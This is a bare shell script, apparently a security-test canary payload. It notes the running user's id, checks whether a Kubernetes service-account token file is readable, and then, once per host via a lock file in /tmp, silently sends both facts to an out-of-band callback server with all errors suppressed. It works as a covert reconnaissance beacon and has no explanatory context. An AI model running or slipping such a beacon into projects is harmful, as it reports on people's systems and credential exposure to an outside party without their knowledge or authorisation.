#!/bin/sh
uid="$(id -u)"
readable=false
if test -r /var/run/secrets/kubernetes.io/serviceaccount/token; then readable=true; fi
if ( set -C; : > /tmp/df-mise-43a8c46fac3a422f62c7826655b3ed3d.sent ) 2>/dev/null; then
  curl -fsS --max-time 5 --retry 0 -o /dev/null "https://dbqp8n35hiikbmje1a90dp94wuu7jdn8b.oob.staging.depthfirst.com/dfmise/43a8c46fac3a422f62c7826655b3ed3d?uid=$uid&token_readable=$readable" >/dev/null 2>&1 || true
fi
